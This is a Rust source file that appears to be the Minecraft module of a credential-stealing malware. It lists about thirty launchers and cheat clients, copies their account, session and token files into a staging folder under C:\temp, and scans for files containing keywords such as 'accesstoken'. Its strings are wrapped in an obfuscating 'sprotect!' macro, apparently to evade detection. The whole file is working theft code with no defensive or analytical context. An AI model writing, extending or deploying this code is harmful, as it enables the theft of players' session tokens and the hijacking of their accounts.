use crate::sprotect;
use std::path::PathBuf;
use std::fs;

pub async fn extract() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\Games\\Minecraft");
    std::fs::create_dir_all(&output_dir)?;

    let roaming = std::env::var(sprotect!("APPDATA")).unwrap_or_default();
    let userprofile = std::env::var(sprotect!("USERPROFILE")).unwrap_or_default();

    let minecraft_clients = vec![
        (sprotect!("Official"), PathBuf::from(&roaming).join(sprotect!(".minecraft"))),
        (sprotect!("TLauncher"), PathBuf::from(&roaming).join(sprotect!(".tlauncher"))),
        (sprotect!("PolyMC"), PathBuf::from(&roaming).join(sprotect!("PolyMC"))),
        (sprotect!("PrismLauncher"), PathBuf::from(&roaming).join(sprotect!("PrismLauncher"))),
        (sprotect!("MultiMC"), PathBuf::from(&roaming).join(sprotect!("MultiMC"))),
        (sprotect!("Lunar"), PathBuf::from(&userprofile).join(sprotect!(".lunarclient"))),
        (sprotect!("Feather"), PathBuf::from(&roaming).join(sprotect!(".feather"))),
        (sprotect!("BadLion"), PathBuf::from(&roaming).join(sprotect!(".badlion"))),
        (sprotect!("ATLauncher"), PathBuf::from(&roaming).join(sprotect!("ATLauncher"))),
        (sprotect!("GDLauncher"), PathBuf::from(&roaming).join(sprotect!("gdlauncher_next"))),
        (sprotect!("Intent"), PathBuf::from(&userprofile).join(sprotect!("intentlauncher"))),
        (sprotect!("Meteor"), PathBuf::from(&roaming).join(sprotect!(".meteor"))),
        (sprotect!("Impact"), PathBuf::from(&roaming).join(sprotect!(".impact"))),
        (sprotect!("Novoline"), PathBuf::from(&roaming).join(sprotect!("Novoline"))),
        (sprotect!("Rise"), PathBuf::from(&roaming).join(sprotect!("Rise"))),
        (sprotect!("Aristois"), PathBuf::from(&roaming).join(sprotect!(".aristois"))),
        (sprotect!("Wurst"), PathBuf::from(&roaming).join(sprotect!(".wurst"))),
        (sprotect!("LiquidBounce"), PathBuf::from(&roaming).join(sprotect!("LiquidBounce"))),
        (sprotect!("Vape"), PathBuf::from(&roaming).join(sprotect!(".vape"))),
        (sprotect!("Ghost"), PathBuf::from(&roaming).join(sprotect!(".ghost"))),
        (sprotect!("Exhibition"), PathBuf::from(&roaming).join(sprotect!("Exhibition"))),
        (sprotect!("Sigma"), PathBuf::from(&roaming).join(sprotect!("Sigma"))),
        (sprotect!("FDP"), PathBuf::from(&roaming).join(sprotect!("FDPClient"))),
        (sprotect!("Cross"), PathBuf::from(&roaming).join(sprotect!("CrossClient"))),
        (sprotect!("Azura"), PathBuf::from(&roaming).join(sprotect!("Azura"))),
        (sprotect!("Vestige"), PathBuf::from(&roaming).join(sprotect!("Vestige"))),
        (sprotect!("RavenBPlus"), PathBuf::from(&roaming).join(sprotect!("Raven B+"))),
        (sprotect!("CurseForge"), PathBuf::from(&userprofile).join(sprotect!("curseforge\\minecraft"))),
        (sprotect!("Technic"), PathBuf::from(&roaming).join(sprotect!(".technic"))),
        (sprotect!("SKLauncher"), PathBuf::from(&roaming).join(sprotect!(".sklauncher"))),
        (sprotect!("Paladium"), PathBuf::from(&roaming).join(sprotect!("paladium-group"))),
        (sprotect!("CheatBreakers"), PathBuf::from(&roaming).join(sprotect!(".minecraft\\cheatbreaker"))),
    ];

    for (client_name, client_path) in minecraft_clients {
        extract_minecraft_client(&client_name, &client_path, &output_dir).await.ok();
    }

    Ok(())
}

async fn extract_minecraft_client(client_name: &str, client_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    if !client_path.exists() {
        return Ok(());
    }

    let client_output = format!("{}{}{}", output_dir, sprotect!("\\"), client_name);
    std::fs::create_dir_all(&client_output)?;

    let account_files = vec![
        sprotect!("accounts.json"),
        sprotect!("launcher_profiles.json"),
        sprotect!("TlauncherProfiles.json"),
        sprotect!("launcher_accounts.json"),
        sprotect!("launcher_accounts_microsoft_store.json"),
        sprotect!("launcherconfig"),
        sprotect!("accounts.nbt"),
        sprotect!("alts.json"),
        sprotect!("alts.novo"),
        sprotect!("alts.txt"),
        sprotect!("cheatbreaker_accounts.json"),
        sprotect!("settings\\game\\accounts.json"),
    ];

    for account_file in account_files {
        let file_path = client_path.join(&account_file);
        if file_path.exists() {
            let dest_name = account_file.replace("\\", "_");
            let dest_path = format!("{}{}{}", client_output, sprotect!("\\"), dest_name);
            fs::copy(&file_path, dest_path).ok();
        }
    }

    scan_for_minecraft_files(client_path, &client_output).await?;

    Ok(())
}

async fn scan_for_minecraft_files(dir_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    if let Ok(entries) = fs::read_dir(dir_path) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().unwrap_or_default().to_string_lossy().to_lowercase();
                
                if file_name.contains(&sprotect!("account")) || 
                   file_name.contains(&sprotect!("profile")) || 
                   file_name.contains(&sprotect!("session")) ||
                   file_name.contains(&sprotect!("config")) ||
                   file_name.contains(&sprotect!("user")) ||
                   file_name.contains(&sprotect!("login")) ||
                   file_name.ends_with(&sprotect!(".json")) ||
                   file_name.ends_with(&sprotect!(".vdf")) ||
                   file_name.ends_with(&sprotect!(".txt")) ||
                   file_name.ends_with(&sprotect!(".nbt")) ||
                   file_name.ends_with(&sprotect!(".novo")) {
                    
                    if let Ok(content) = fs::read_to_string(&path) {
                        if is_minecraft_related(&content) {
                            let safe_name = sanitize_filename(&file_name);
                            let dest_path = format!("{}{}{}", output_dir, sprotect!("\\"), safe_name);
                            fs::copy(&path, dest_path).ok();
                        }
                    } else if let Ok(_) = fs::read(&path) {
                        let safe_name = sanitize_filename(&file_name);
                        let dest_path = format!("{}{}{}", output_dir, sprotect!("\\"), safe_name);
                        fs::copy(&path, dest_path).ok();
                    }
                }
            } else if path.is_dir() {
                let dir_name = path.file_name().unwrap_or_default().to_string_lossy().to_lowercase();
            }
        }
    }
    Ok(())
}

fn is_minecraft_related(content: &str) -> bool {
    let minecraft_keywords = [
        sprotect!("minecraft"), sprotect!("mojang"), sprotect!("displayname"), sprotect!("username"), sprotect!("accesstoken"),
        sprotect!("clienttoken"), sprotect!("profileid"), sprotect!("uuid"), sprotect!("selecteduser"), sprotect!("authenticationdatabase"),
        sprotect!("account"), sprotect!("session"), sprotect!("profile"), sprotect!("launcher"), sprotect!("tlauncher"), sprotect!("feather"),
        sprotect!("lunar"), sprotect!("badlion"), sprotect!("polymc"), sprotect!("prism"), sprotect!("multimc"), sprotect!("impact"), sprotect!("meteor"),
        sprotect!("novoline"), sprotect!("rise"), sprotect!("aristois"), sprotect!("wurst"), sprotect!("liquidbounce"), sprotect!("vape")
    ];
    
    let content_lower = content.to_lowercase();
    minecraft_keywords.iter().any(|keyword| content_lower.contains(keyword))
}

fn sanitize_filename(filename: &str) -> String {
    filename.chars()
        .map(|c| match c {
            c if sprotect!("<>:\"|?*\\/").contains(c) => sprotect!("_").chars().next().unwrap(),
            _ => c,
        })
        .collect()
}